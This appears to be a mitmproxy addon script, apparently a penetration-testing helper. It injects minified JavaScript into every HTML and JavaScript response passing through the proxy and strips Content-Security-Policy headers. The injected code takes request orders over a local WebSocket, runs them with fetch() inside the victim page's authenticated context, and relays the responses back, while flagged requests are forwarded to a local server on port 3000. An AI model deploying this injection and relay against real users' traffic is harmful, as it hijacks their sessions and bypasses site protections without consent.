from mitmproxy import http
import aiohttp
import time
import base64

flag_req = None
jstext = '''function socket_start(){const i=new WebSocket("ws://127.0.0.1:8765");(window.globalSocket121=i).onopen=function(t){i.send("password=123456")},i.onmessage=function(t){t=atob(t.data).split("------------");const a=t[0];var e=t[1];if(2==t.length)try{var[o,n,s,r,d]=e.split("[][][][][][]"),o=atob(o),n=atob(n),r=(atob(s),atob(r)),d=atob(d),b={};const c={};null!=d&&""!==d&&d.split("|||").map(t=>t.trim().split(": ")).forEach(([t,e])=>{c[t]=e}),b.method=o,["GET","HEAD","OPTIONS"].includes(o.toUpperCase())||(b.body=r),0<Object.keys(c).length&&(b.headers=new Headers(c)),fetch(n,b).then(t=>{const e=t.status.toString(),o={};return t.headers.forEach((t,e)=>{o[e]=t}),headersString=JSON.stringify(o),(xydata=t.text()).then(t=>({statusCode:e,headersString:headersString,xydata:t}))}).then(({statusCode:t,headersString:e,xydata:o})=>{o=function(t){for(var e="",o=new Uint8Array(t),a=o.byteLength,n=0;n<a;n++)e+=String.fromCharCode(o[n]);return e}((new TextEncoder).encode(o));i.send(btoa(a+"------------"+btoa(t)+"------------"+btoa(e)+"------------"+btoa(o)))}).catch(t=>{i.send(btoa(a+"------------"+btoa(0)+"------------"+btoa(0)+"------------"+btoa(0)))})}catch(t){i.send(btoa(a+"------------"+btoa(0)+"------------"+btoa(0)+"------------"+btoa(0)))}}}void 0!==window.globalSocket121&&window.globalSocket121.readyState!==WebSocket.CLOSED||socket_start();'''


class CustomResponse:

    def __init__(self):
        self.num = 0

    async def request(self, flow: http.HTTPFlow) -> None:
        global flag_req
        flag_req = flow.request.headers.get('Req-flag', '')
        if flag_req:
            await self.handle_delayed_request(flow)

    async def handle_delayed_request(self, flow: http.HTTPFlow) -> None:
        url = flow.request.url
        method = flow.request.method
        headers = flow.request.headers
        newheaders = '|||'.join(
            [f'Res-flag: {value}' if key == 'Req-flag' else f'{key}: {value}' for (key, value) in headers.items()])
        content_type = flow.request.headers.get('Content-Type', '')
        if 'application/json' in content_type:
            data1 = flow.request.text
            reqtype = 'json'
        elif 'application/x-www-form-urlencoded' in content_type:
            data1 = flow.request.text
            reqtype = 'xform'
        elif 'multipart/form-data' in content_type:
            if 'form-data' not in str(flow.request.text):
                data1 = ''
            else:
                data1 = flow.request.text
            reqtype = 'formdata'
        else:
            reqtype = ''
            data1 = ''
        burp0_json = {'data': base64.b64encode(data1.encode()).decode(),
                      'header': base64.b64encode(newheaders.encode()).decode(), 'method': str(method), 'type': reqtype,
                      'url': base64.b64encode(url.encode()).decode()}
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post('http://127.0.0.1:3000/api',
                                        headers={'Content-Type': 'application/json;charset=UTF-8'},
                                        json=burp0_json) as response:
                    aa = http.Headers()
                    for (key, value) in response.headers.items():
                        aa.add(key, value)
                    response2 = http.Response(http_version=b'HTTP/1.1', status_code=response.status,
                                              reason=response.reason.encode(), headers=aa,
                                              content=await response.read(), trailers=None, timestamp_start=time.time(),
                                              timestamp_end=time.time())
                    flow.response = response2
        except:
            flow.response.content = 'flask服务器请求失败，检查server.py是否启动'

    def response(self, flow: http.HTTPFlow) -> None:
        global jstext
        resflag = flow.request.headers.get('Res-Flag', '')
        flag_req = flow.request.headers.get('Req-flag', '')
        if not flag_req and (not resflag):
            content_type = flow.response.headers.get('Content-Type', '').lower()
            if flow.response.text:
                if content_type.startswith('application/javascript'):
                    flow.response.text += jstext
                if content_type.startswith('text/html'):
                    flow.response.text += '<script>' + jstext + '</script>'
            if 'Content-Security-Policy' in flow.response.headers:
                del flow.response.headers['Content-Security-Policy']


addons = [CustomResponse()]
